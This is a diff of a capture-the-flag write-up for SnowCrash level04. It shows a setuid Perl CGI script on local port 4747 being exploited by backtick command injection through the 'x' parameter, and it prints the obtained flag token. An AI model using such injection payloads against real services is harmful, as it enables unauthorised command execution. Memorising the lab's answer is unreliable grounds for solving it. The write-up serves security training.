@@ -1,9 +1,9 @@
-# Goal:
+# level04 - CGI Perl Script
 
-find level04 flag
-flag can be obtained by running the getflag program as flag03 user
+## Home
 
-# Reconnaissance
+- `level04 home` contains a perl script named `level04.pl` that belongs to `flag04`.
+- The script is setuid and setgid. It will execute with `flag04` permissions.
 
 ```
 level04@SnowCrash:~$ ls -al
@@ -14,6 +14,11 @@ d--x--x--x  1 root    users    340 Aug 30  2015 ..
 -r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
 -rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
 -r-x------  1 level04 level04  675 Apr  3  2012 .profile
+```
+
+## `level04.pl`
+
+```
 level04@SnowCrash:~$ cat level04.pl
 #!/usr/bin/perl
 # localhost:4747
@@ -27,13 +32,11 @@ x(param("x"));
 level04@SnowCrash:~$
 ```
 
-level04 home directory contain an executable perl script belonging to flag04 user. It is setuid and setgid and will then run with flag04 privileges.
+- The file seems to be a cgi script running on localhost, port 4747. It echo the request parameter named x.
 
-## flag04.pl
+## Apache on port 4747
 
-- flag04.pl seems to be a cgi script running on localhost, port 4747. It echo the request parameter named x.
-
-## port 4747
+- A service is effectively running on port 4747 under a TCP6 protocol.
 
 ```
 level04@SnowCrash:~$ netstat -lt
@@ -47,7 +50,7 @@ tcp6       0      0 [::]:http               [::]:*                  LISTEN
 tcp6       0      0 [::]:4242               [::]:*                  LISTEN
 ```
 
-A service is effectively listening on port 4747. Let ask it who it is:
+- The service is Apache2.2.22
 
 ```
 level04@SnowCrash:~$ curl "localhost:4747/badway"
@@ -73,8 +76,6 @@ level04@SnowCrash:~$ curl "localhost:4747/whoareyou"
 </body></html>
 ```
 
-The service is Apache2.2.22
-
 ```
 level04@SnowCrash:~$ ls /etc/apache2/sites-enabled/
 000-default  level05.conf  level12.conf
@@ -93,9 +94,13 @@ level04@SnowCrash:~$ cat /etc/apache2/sites-enabled/level05.conf
 </VirtualHost>
 ```
 
-# Exploitation
+## `getflag` over IP
 
-As the parameter x is in a shell command executed as flag04, we can try a command injection to execute the getflag program:
+- As the parameter x is in a shell command executed as flag04, we can try a command injection to execute the getflag program:
 
 ``level04@SnowCrash:~$ curl 'localhost:4747?x=`getflag`'
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap``
+
+# Getflag
+
+- level05 password (flag): `ne2searoevaevoem4ov4ar8ap`
